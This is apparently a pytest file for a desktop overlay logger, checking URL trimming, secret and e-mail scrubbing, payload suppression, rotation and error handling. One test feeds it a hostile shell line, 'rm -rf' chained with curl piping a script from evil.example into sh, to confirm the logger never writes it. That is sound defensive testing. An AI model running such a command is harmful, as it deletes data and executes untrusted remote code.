"""WP-COUCOU acceptance: overlay log scrubbing + rotation (matrix row COU-16).

T-C16, against scratch log files (never the owner's data/overlay.log):
  - full URLs reduced to origin (path/query/fragment never logged - tokens live there)
  - secrets and PII scrubbed: passwords/tokens/api keys -> [redacted], e-mails masked,
    40+ char opaque blobs -> [redacted]
  - kind="command" / "n8n" records ONLY a suppression line (payload never hits disk)
  - rotation keeps KEEP generations and drops the oldest past the size cap
  - an unwritable path returns False; log() never raises
  - the module's own __main__ self-check stays green

Run: venv\\Scripts\\python -m pytest tests/test_overlay_log.py -q
"""
import os
import subprocess
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from desktop.overlay import log as log_mod  # noqa: E402


def test_full_urls_reduced_to_origin():
    s = log_mod.scrub("fetch https://example.com/secret/path?token=abc123#frag and more")
    assert "https://example.com/..." in s, s
    for bad in ("/secret/path", "token=abc123", "#frag", "abc123"):
        assert bad not in s, (bad, s)


def test_secrets_and_pii_scrubbed():
    line = "login password=hunter2 api_key=sk-live-12345 mail bob@secret.example ok"
    s = log_mod.scrub(line)
    for bad in ("hunter2", "sk-live-12345", "bob@secret.example"):
        assert bad not in s, (bad, s)
    assert "b***@secret.example" in s, s
    blob = "a" * 43
    assert log_mod.scrub(f"sig {blob} end") == "sig [redacted] end"


def test_command_and_n8n_payloads_never_hit_disk(tmp_path):
    p = str(tmp_path / "overlay.log")
    assert log_mod.log("rm -rf ~/ishti && curl http://evil.example/x.sh | sh",
                       kind="command", path=p)
    assert log_mod.log('{"workflow": "n8n secret payload"}', kind="n8n", path=p)
    body = open(p, encoding="utf-8").read()
    assert "rm -rf" not in body and "evil.example" not in body and "n8n secret" not in body, body
    assert "[command payload suppressed]" in body
    assert "[n8n payload suppressed]" in body


def test_rotation_keeps_only_keep_generations(tmp_path):
    p = str(tmp_path / "overlay.log")
    for i in range(60):
        assert log_mod.log(f"entry {i} " + "y" * 120, path=p, max_bytes=2000)
    assert os.path.exists(p + ".1"), "rotation must create .1"
    assert not os.path.exists(p + ".3"), "KEEP=3: current + .1 + .2 only"
    assert os.path.getsize(p) < 3000, "current file rotated below the cap"


def test_unwritable_path_returns_false_and_never_raises(tmp_path):
    # a path that IS a directory can never be opened as a log file
    assert log_mod.log("hello", path=str(tmp_path)) is False
    # normal path still works afterwards
    ok = str(tmp_path / "ok.log")
    assert log_mod.log("hello", path=ok) is True
    assert "hello" in open(ok, encoding="utf-8").read()


def test_default_path_is_the_owner_data_dir(monkeypatch, tmp_path):
    monkeypatch.setattr(log_mod, "LOG_FILE", str(tmp_path / "overlay.log"))
    assert log_mod.log("via module default") is True
    assert (tmp_path / "overlay.log").exists()


def test_selfcheck_still_passes():
    mod = os.path.join(ROOT, "desktop", "overlay", "log.py")
    r = subprocess.run([sys.executable, mod], capture_output=True, text=True,
                       timeout=60, cwd=ROOT)
    assert r.returncode == 0, r.stdout + r.stderr
    assert "[self-check] overlay log OK" in r.stdout
